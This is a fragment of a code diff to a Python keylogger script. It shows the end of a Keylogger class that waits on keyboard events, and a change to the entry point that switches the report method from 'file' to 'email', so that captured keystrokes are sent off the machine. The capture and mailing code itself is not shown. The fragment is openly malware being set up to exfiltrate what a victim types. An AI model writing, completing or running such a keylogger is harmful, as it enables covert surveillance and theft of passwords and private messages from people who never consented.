@@ -76,6 +76,7 @@ class Keylogger:
         self.report()
         keyboard.wait()
 
+
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     keylogger.start()
